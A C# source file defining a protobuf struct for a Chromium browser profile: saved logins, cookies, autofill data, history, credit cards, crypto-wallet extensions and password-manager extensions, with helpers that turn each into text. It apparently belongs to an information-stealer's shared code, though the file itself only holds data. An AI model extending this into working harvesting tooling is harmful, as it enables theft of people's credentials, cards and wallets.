

using ProtoBuf;
using System;


namespace InvokedCommon.Structs
{
	[ProtoContract]
	public struct ChromiumProfile
	{
		[ProtoMember(1)]
		public string profileName;
		[ProtoMember(2)]
		public Login[] logins;
		[ProtoMember(3)]
		public Cookie[] cookies;
		[ProtoMember(4)]
		public AutoFill[] autofills;
		[ProtoMember(5)]
		public Download[] downloads;
		[ProtoMember(6)]
		public HistoryEntry[] history;
		[ProtoMember(7)]
		public ChromiumCreditCard[] creditCards;
		[ProtoMember(8)]
		public ChromiumCryptoExtension[] cryptoExtensions;
		[ProtoMember(9)]
		public ChromiumPasswordExtension[] passwordManagerExtensions;

		public ChromiumProfile(
		    Login[] _logins,
		    Cookie[] _cookies,
		    AutoFill[] _autofills,
		    Download[] _downloads,
		    HistoryEntry[] _history,
		    ChromiumCreditCard[] _creditCards,
		    ChromiumCryptoExtension[] _cryptoExtensions,
		    ChromiumPasswordExtension[] _passwordManagerExtensions,
		    string _profileName)
		{
			this.profileName = _profileName;
			this.logins = _logins != null ? _logins : new Login[0];
			this.cookies = _cookies != null ? _cookies : new Cookie[0];
			this.autofills = _autofills != null ? _autofills : new AutoFill[0];
			this.downloads = _downloads != null ? _downloads : new Download[0];
			this.history = _history != null ? _history : new HistoryEntry[0];
			this.creditCards = _creditCards != null ? _creditCards : new ChromiumCreditCard[0];
			this.cryptoExtensions = _cryptoExtensions != null ? _cryptoExtensions : new ChromiumCryptoExtension[0];
			if (_passwordManagerExtensions == null)
				this.passwordManagerExtensions = new ChromiumPasswordExtension[0];
			else
				this.passwordManagerExtensions = _passwordManagerExtensions;
		}

		public string GetLoginsString()
		{
			string loginsString = "";
			foreach (Login login in this.logins)
				loginsString = loginsString + login.ToString() + Environment.NewLine + Environment.NewLine;
			return loginsString;
		}

		public string GetCookiesString()
		{
			string cookiesString = "";
			foreach (Cookie cookie in this.cookies)
				cookiesString = cookiesString + cookie.ToString() + Environment.NewLine + Environment.NewLine;
			return cookiesString;
		}

		public string GetAutofillsString()
		{
			string autofillsString = "";
			foreach (AutoFill autofill in this.autofills)
				autofillsString = autofillsString + autofill.ToString() + Environment.NewLine + Environment.NewLine;
			return autofillsString;
		}

		public string GetDownloadsString()
		{
			string downloadsString = "";
			foreach (Download download in this.downloads)
				downloadsString = downloadsString + download.ToString() + Environment.NewLine + Environment.NewLine;
			return downloadsString;
		}

		public string GetHistoryString()
		{
			string historyString = "";
			foreach (HistoryEntry historyEntry in this.history)
				historyString = historyString + historyEntry.ToString() + Environment.NewLine + Environment.NewLine;
			return historyString;
		}

		public string GetCreditCardsString()
		{
			string creditCardsString = "";
			foreach (ChromiumCreditCard creditCard in this.creditCards)
				creditCardsString = creditCardsString + creditCard.ToString() + Environment.NewLine + Environment.NewLine;
			return creditCardsString;
		}

		public string GetCryptoExtensionsString()
		{
			string extensionsString = "";
			foreach (ChromiumCryptoExtension cryptoExtension in this.cryptoExtensions)
				extensionsString = extensionsString + cryptoExtension.ToString() + Environment.NewLine + Environment.NewLine;
			return extensionsString;
		}

		public string GetPasswordExtensionsString()
		{
			string extensionsString = "";
			foreach (ChromiumPasswordExtension managerExtension in this.passwordManagerExtensions)
				extensionsString = extensionsString + managerExtension.ToString() + Environment.NewLine + Environment.NewLine;
			return extensionsString;
		}
	}
}